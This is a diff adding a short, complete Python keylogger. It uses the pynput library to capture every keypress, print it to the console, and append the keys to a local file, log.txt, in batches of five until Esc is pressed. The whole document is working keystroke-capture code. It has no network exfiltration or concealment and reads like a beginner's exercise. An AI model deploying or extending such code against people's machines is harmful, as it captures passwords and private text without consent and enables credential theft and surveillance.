@@ -1,0 +1,37 @@
+import pynput
+
+from pynput.keyboard import Key, Listener
+
+count = 0 #to update the txt file
+keys = [] #store keys into this list
+
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    print("{0} pressed".format(key))
+    if count >= 5: #update file after every 5 keys pressed
+        count = 0
+        write_file(keys)
+        keys = [] #reset keys
+
+#to save keys onto a file
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys: #loop through keys to write into file
+            k = str(key).replace("'", "") #removes the quotation marks
+            if k.find("space") > 0: #look for space in key and then write a space character
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
+
+def on_release(key):
+    pass
+    if key == Key.esc: # to break out of loop
+        return False
+
+# functions that are called when a key is pressed
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
